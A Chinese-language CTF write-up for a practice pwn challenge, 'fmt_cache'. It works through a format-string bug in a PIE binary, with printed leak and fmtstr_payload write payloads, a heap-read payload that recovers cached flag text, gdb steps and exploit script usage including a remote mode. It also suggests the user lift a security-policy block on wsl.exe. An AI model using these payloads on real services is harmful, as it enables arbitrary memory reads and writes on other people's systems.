---
title: "fmt_cache（格式化字符串 + FILE IO 缓存残留）"
date: 2026-11-13 00:00:00
categories:
  - 题目复现
  - 其他赛事
tags: [x86-64, PIE, 格式化字符串任意读写, fmtstr_payload, glibc FILE 缓冲, 栈上变量布局]
---

> 本文由 `tools/import_from_wp.py` 从 `fmt_cache.md` 导入，正文未改动。
>
> - 赛事：练习 / 自出题（附件自带源码 Makefile / fmt_cache.c）
> - 来源：实战记录（附件静态分析 + 离线模拟验证）
> - 方向：Pwn
> - 难度：中等
> - flag：flag{lelellel}（附件目录内 flag 文件内容；本机无 Linux 执行环境，未取得程序回显）
> - 日期：2026-11-13
> - 技术栈：x86-64 / PIE / 格式化字符串任意读写 / fmtstr_payload / glibc FILE 缓冲 / 栈上变量布局
> - 状态：机制已解出，待本地实测
> - 环境：附件 fmt_cache（PIE + Full RELRO + Canary + NX），7 次菜单机会，flag 文件同目录

<!-- 原始题解元信息保留如上；Hexo 分类/标签见 front matter -->
# fmt_cache

## 一、题面

64 位 PIE 可执行程序，`-pie -Wl,-z,relro,-z,now -z noexecstack`，带 `-g` 调试信息、Canary。
交互极简：

```
1. gift
> 1      -> 若全局变量(栈上) check == printf@plt 则调用 gift()
> 其它   -> fmt> <输入>  然后 printf(输入); puts("")
```

附件源码 `fmt_cache.c` 里最关键的四处：

```c
int main(void) {
    long check;              /* 未初始化！与 printf@plt 比较 */
    char fmtbuf[0x100];
    char *note;
    unsigned long op;
    ...
    note = malloc(0x20); memcpy(note, "hello", 6); puts(note);
    while (1) {
        op = read_ulong();
        if (op == 1) {
            if (check == printf_plt()) gift();   /* 唯一的 flag 入口 */
            else puts("no");
        } else {
            read_n(fmtbuf, sizeof(fmtbuf));
            printf(fmtbuf);                     /* 格式化字符串漏洞 */
            puts("");
        }
        if (--tickets <= 0) { if (gfp) fclose(gfp); bye(); }   /* tickets 初值 7 */
    }
}

static void gift(void) {
    char flag[0x80];
    gfp = fopen("./flag", "r");
    memset(flag, 0, sizeof(flag));
    fgets(flag, sizeof(flag), gfp);
    memset(flag, 0, sizeof(flag));   /* 只清栈，不清堆里的 FILE IO 缓存 */
}
```

- **唯一输出通道**：`printf(fmtbuf)`（以及启动时的 `hello`）；没有 show 功能。
- **唯一 flag 入口**：`gift()` 要求 `check == printf@plt`，而 `check` 是未初始化的栈变量。
- **flag 不会直接打印**：`gift()` 把栈上 `flag[]` 清空，但 `fopen/fgets` 在**堆上**为 FILE 分配的读缓冲区里仍留着 flag 全文，直到 `fclose(gfp)`（第 7 次循环结束）才释放。这正是题名 `fmt_cache` 的含义，也是聊天截图里那句「heap 中有 io 的缓存 / 调试找一下 heap 的偏移」的意思。
- **预算**：`tickets = 7`，最多 7 次菜单操作。本解只用 4 次。

## 二、思路

1. `printf(fmtbuf)` 把用户输入当格式串 → 同时具备**任意地址读**（`%N$s`）与**任意地址写**（`%N$n` / `fmtstr_payload`）。
2. Full RELRO 下 GOT 不可写，但 `check` 是栈上的普通变量，`printf@plt` 是 PIE 内固定偏移（`0x1180`）。所以不需要劫持控制流，**把 check 改对即可**。
3. 改 check 要三个量：`check` 的栈地址、`printf@plt` 的运行时地址、以及格式化串自身的栈参数编号。
   - 栈地址：由 `%p` 泄漏一个指向 `fmtbuf` 的栈残留指针（实测 `%2$p`），`check = fmtbuf - 8`（静态可证）。
   - PIE base：由栈上残留的 `main` 地址反推（`%49$p - 0x1627`）。
   - 参数编号：**可以纯静态算出来**，见 3.1。
4. 改完 check → 选 1 → `gift()` 把 flag 读进堆上的 FILE 缓冲 → 再用一次 `%11$s` 指向 `note + 偏移` 把它打印出来。

## 三、关键步骤

### 3.1 静态算参数编号（本题最重要的纠正）

`objdump -d -S --disassemble=main fmt_cache`：

```
1627 <main>:  push %rbp
162c:         mov %rsp,%rbp
162f:         sub $0x130,%rsp        # 栈帧 0x130
...
170a:         lea -0x110(%rbp),%rax  # fmtbuf = rbp-0x110
1719:         call read_n
171e:         lea -0x110(%rbp),%rax
1725:         mov %rax,%rdi
172d:         call printf@plt        # 纯格式串，无额外参数
```

变量布局：`note = rbp-0x128`，`op = rbp-0x120`，`check = rbp-0x118`，`fmtbuf = rbp-0x110`。

`call` 时 `rsp = rbp-0x130`，压入返回地址后进入 `printf` 时 `rsp' = rbp-0x138`。
x86-64 SysV 下第 6 个及以后的变参依次在 `[rsp'+8]`、`[rsp'+0x10]`…，于是：

| 变参编号 | 地址 | 内容 | 用途 |
|---|---|---|---|
| #6 | rbp-0x130 | 未用栈槽 | — |
| **#7** | rbp-0x128 | `note` 堆指针 | `%7$p` 拿堆基址参照（**静态可证**） |
| #8 | rbp-0x120 | `op` | — |
| **#9** | rbp-0x118 | `check` 当前值 | `%9$p` 检查高位是否有脏字节 |
| **#10** | rbp-0x110 | `fmtbuf[0:8]` | **格式串自身起点** |
| **#11** | rbp-0x108 | `fmtbuf[8:16]` | 把地址放前缀 8 字节之后即用 `%11$s` |

> **用户给的公式「偏移 = 6 + n/8」需要修正**：`6` 是「格式串恰好落在第 6 个变参」这种常见情况的基址，不是常数。本题 `main` 栈帧大，格式串起点是 **10**，所以是 `10 + n/8`。
> `fmtstr_payload(10, {...})` 里 pwntools 会自动把地址放在 payload 末尾并对齐；例如它生成的前缀长 56 字节 = 7 个 qword，地址就从参数 `10+7=17` 开始（实际 payload 里正是 `%17$lln`、`%18$hhn`…`%22$hhn`）。

`printf@plt = 0x1180`、`main = 0x1627` 均由 `objdump -d` 直接确认（`printf_plt()` 内联汇编 `lea printf@plt(%rip)`）。

### 3.2 一次 leak 拿齐四个量

```python
fmt = b'%2$p.%7$p.%9$p.%49$p'
fmtbuf, note, check_val, main_addr = [int(x,16) for x in out.split(b'.')]
pie        = main_addr - 0x1627
printf_plt = pie + 0x1180
check_addr = fmtbuf - 8
```

- `%2$p`（rdx 寄存器残留）实测指向 `fmtbuf`，属于**运行时残留，不是架构保证**；脚本带 `--probe` 打印 `%1$p..%40$p`，环境不同就换编号并可用 `--check-addr` 手动指定。
- `%49$p` 是 `__libc_start_main` 栈帧里残留的 `main` 指针（低 12 位应为 `0x627`）；脚本会检查 `pie` 是否页对齐，不对就告警。

### 3.3 用 fmtstr_payload 改 check

```python
writes  = {check_addr: printf_plt}
payload = fmtstr_payload(10, writes, write_size='byte')   # 104 字节
```

pwntools 生成的是：

```
%128c%17$lln%209c%18$hhn%4c%19$hhn%20$hhn%21$hhn%22$hhna
+ p64(check_addr) ... p64(check_addr+5)   （6 个地址，每个 8 字节）
```

- 第一条 `%17$lln` 先把 8 字节整体写成小值 128，**顺手清掉 `check` 高位的未初始化脏数据**；随后 6 个 `%hhn` 逐字节写入 `printf_plt` 的低 6 字节。
- 前缀 56 字节 / 8 = 7 → 地址从参数 17 起，与 3.1 的公式一致。
- 104 字节 < `read_n(buf, 0x100)` 的 255 字节上限。

**离线验证**（`python3 exp_fmt_cache.py --selftest`，本机实测输出）：

```
[*] selftest payload (104 bytes): b'%128c%17$lln%209c%18$hhn%4c%19$hhn...'
[*] check 初值 0000000000000000 -> 0x555555555180 (期望 0x555555555180)
[*] check 初值 aaaaaaaaaaaaaaaa -> 0x555555555180 (期望 0x555555555180)
[*] check 初值 ffffffffffffffff -> 0x555555555180 (期望 0x555555555180)
[+] selftest 通过：fmtstr_payload(10, {...}) 能把 check 写成 printf@plt
```

模拟器逐 token 解析 `%<n>c` 累加计数、按 `%<idx>$hhn/lln` 写目标地址，对三种初始脏值都得到目标值，证明 payload 与偏移 `10` 正确。

### 3.4 选项 1 触发 gift，然后找 heap 偏移

`gift()` 里 `fopen` 分配 `FILE` 结构体、`fgets` 首次读触发 `_IO_file_doallocate` 在**堆上** malloc 一块读缓冲，flag 全文就被读进这块缓冲；随后 `memset(flag, ...)` 只清栈上副本。所以 flag 在堆里活到 `fclose(gfp)`。

偏移 `flag_addr = note + OFF`（`OFF` 是 `note` 用户指针到 flag 首字节的距离）取决于 glibc 版本、文件 `st_blksize`、以及之前 malloc 的历史，**必须自己调试量一次**（截图提示的「找一下 heap 的偏移」）：

```gdb
gdb ./fmt_cache
b gift
c
finish                       # gift 已返回，fopen/fgets 都执行完
# pwndbg:
search -t string "flag{"      # 或 find /b heap_start, heap_end, 'f','l','a','g','{'
x/s <命中地址>
p/x <命中地址> - <note>       # 得到 OFF
```

附件目录里现成 exp 的实测值是 `OFF = 0x210`，本脚本默认用它，另提供：

- `--heap-off 0x???` 直接覆盖；
- `--scan` 一次 `%s` 打 17 个候选偏移（`note + OFF ± 0x100`，步长 `0x20`，payload 240 字节），一次循环扫完，不额外消耗 tickets。

### 3.5 读 flag

```python
payload = b'%11$s' + b'B'*3 + p64(note + OFF)   # 前缀 8 字节 → 地址在参数 11
```

`printf` 不校验 `%s` 的指针是否合法，直接把堆缓冲里的 `flag{...}` 打出来；用正则 `[Ff][Ll][Aa][Gg]\{[^}]*\}` 提取。

## 四、核心脚本

`WP/实战记录/Pwn/exp_fmt_cache.py`（同目录）：

```python
note, check_addr, check_val, printf_plt = leak(io, args)
write_check(io, check_addr, check_val, printf_plt)   # fmtstr_payload(10, {...})
gift(io)                                            # 菜单 1 -> fopen+fgets
data = read_flag(io, note, 0x210)                   # %11$s 读 heap IO 缓存
```

用法：

```bash
python3 exp_fmt_cache.py --selftest                 # 离线验证写入（不需要 Linux 靶机）
python3 exp_fmt_cache.py --probe                   # 重新定位参数编号
python3 exp_fmt_cache.py --heap-off 0x210          # 本地打
python3 exp_fmt_cache.py --scan                    # 扫描 heap 偏移
python3 exp_fmt_cache.py REMOTE --host 1.2.3.4 --port 9999
```

## 五、给出 flag

附件 `D:\pwn题目\练习\fmt_cache\fmt_cache\flag` 的内容为：

```
flag{lelellel}
```

> **证据边界**：本次工作环境是 Windows，本机 `wsl.exe` 被会话程序黑名单拦截（两次尝试均返回 `PROGRAM BLOCKED BY SECURITY POLICY`），也没有可用的 Kali 虚拟机凭据，因此**没有实际执行 ELF、没有拿到程序回显**。上面的 flag 来自题目自带的 flag 文件，`--selftest` 只验证了格式化串写入语义。按 CTF 流程这属于「机制已解出、未做运行验证」，把 `wsl.exe` 从 安全中心 → 命令安全 → 程序黑名单 移除后我可以补上回显证据。

## 六、坑点

| 现象 | 根因 | 修法 |
|---|---|---|
| 照抄 `fmtstr_payload(6, ...)` 写歪 / 崩溃 | 本题格式串起点是第 **10** 个变参，不是 6 | 按 3.1 静态推导，或 `--probe` 找 `0x41414141` 出现在第几项 |
| `check` 高位有脏字节，改完仍打印 `no` | 未初始化栈变量高 2 字节非 0，只写 6 字节不够 | `fmtstr_payload` 的 `%17$lln` 会整体写 8 字节清零；脚本另外检测 `check_val >> 48` 并显式写 0 |
| 交互卡死 | `read_n` 逐字节读到 `\n` 才停；`gift()` 无任何输出 | payload 用 `sendafter`/`sendline` 精确发送；gift 后只等 `1. gift` 而不要等回显 |
| payload 地址含 `0x0a` 时利用莫名失败 | `read_n` 遇 `\n` 提前结束，地址被截断 | 脚本检测到 `b'\n' in payload` 就重连换 ASLR，最多 6 次 |
| 第 4 次之后就没机会了 | `tickets=7`，且归零时 `fclose(gfp)` 会清掉 IO 缓存 | 4 步内完成；`--scan` 把偏移探测压进一次循环 |
| 换机器/换 glibc 后读不到 flag | `note + 0x210` 是特定堆布局的经验值 | 按 3.4 用 gdb `search "flag{"` 重新量，或用 `--scan` |
| `%2$p` 读出来不像栈地址 | 它是 `read_n` 返回后的寄存器残留，非契约 | `--probe` 找别的栈指针；`--check-addr` 手动指定 |

## 七、复盘

1. **格式化串的参数编号可以静态算**：找到 `main` 的 `sub $N,%rsp` 和 `fmtbuf` 的 `rbp-Off`，再按 `call` 后的 `rsp'` 推出第 6 号变参地址，就能列出 `#7=note / #9=check / #10=fmtbuf` 这类精确对应，比盲目 `%p` 试更可靠。「6+n/8」里的 6 是常见情形而非公理。
2. **未初始化栈变量是可以被格式化串直接改的判定条件**，Full RELRO / Canary / PIE 都不影响——它既不是 GOT、也不是返回地址，只是一个普通栈槽。
3. **`fopen + fgets` 会把文件内容永久留在堆里**（直到 `fclose`），清栈副本没用。这类「IO 缓存残留」题的固定套路是：先触发读文件，再用任意读去堆里找明文。
4. **`fmtstr_payload` 的 `%lln` 是免费的高位清零器**，处理未初始化变量时比手写 `%hhn` 链更省心；但它生成的 payload 里若出现 `0x0a` 会被 `read_n` 截断，逐字节读的输入函数一定要检查 payload 字节。
5. **离线模拟 printf 语义**（解析 `%<n>c` 计数 + `%<idx>$hhn/lln` 写内存）可以在没有靶机的环境里验证任意写 payload 的正确性，是「先读再打」原则的低成本落地。
